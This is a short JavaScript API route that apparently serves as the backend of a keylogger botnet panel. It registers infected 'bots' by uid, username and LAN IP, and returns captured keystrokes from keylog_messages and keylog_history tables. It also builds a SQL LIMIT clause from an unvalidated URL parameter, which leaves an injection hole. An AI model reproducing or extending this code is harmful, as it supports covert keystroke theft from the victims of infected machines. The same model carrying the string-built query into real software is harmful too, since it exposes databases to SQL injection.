// import AcknowledgeAction from "./action";
import { db } from '@/lib/mysql';

export async function GET(req) {
    const urlParams = new URLSearchParams(req.url.split('?')[1]);  
    const uid = urlParams.get('uid'), userid = urlParams.get('userid'), full = urlParams.get('full'), username = urlParams.get('username'), lanip = urlParams.get('lanip'),  page=urlParams.get('page')??0;
    let result = null;
    // const data = { uid, userid, full, username, lanip };
    //add or update bot info
    if (username) {
        result = await db.query("delete from messages_bots where uid=?;", [uid]);
        console.log({ result });
        await db.query("insert into messages_bots(uid, user,lanip) values(?,?,?);", [uid, username, lanip]);
        console.log({ result });
   }
       
   
   //Fetch Bot messages by uid
    const logs = await db.query("select * from keylog_messages where uid=? order by last_updated_time desc;", [uid]);
    const data = logs.map((r) => ({...r, last_updated_time: new Date(r.last_updated_time).toLocaleString('en-US', {timeZone: 'UTC',  year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }) }))
    
   //remove unreads info - set read info: messages for uid, userid 
   if (userid) {
       await db.query("delete from unreads where uid=? and userid=?;", [uid, userid]);
    }
    let fullLogs = [];
    if (full) {
        const rows = (page + 1) * 50;
        const logs = await db.query(`select * from keylog_history where uid=? order by last_updated_time desc limit ${rows};`, [uid]);
        fullLogs = logs.map((r) => ({...r, last_updated_time: new Date(r.last_updated_time).toLocaleString('en-US', {timeZone: 'UTC',  year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }) }))
    }
    
    if (req.test) return { data: logs };
    return Response.json({ data:{...data, ...fullLogs} });
}